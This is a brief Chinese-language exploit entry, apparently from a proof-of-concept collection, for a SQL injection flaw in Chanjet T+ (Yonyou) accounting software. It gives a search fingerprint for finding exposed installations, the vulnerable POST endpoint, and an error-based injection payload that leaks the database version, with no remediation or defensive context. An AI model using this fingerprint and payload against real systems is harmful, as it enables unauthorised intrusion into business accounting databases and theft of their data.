# 畅捷通T+SimulationLoginNew存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/GLSyncService.asmx/SimulationLoginNew HTTP/1.1`

**Payload**
```
toAccountName=1' AND 1 = CONVERT(int, @@version) --&UserName=&AdminPwd=&currentYear=2023-09-09
```
- **响应特征**：200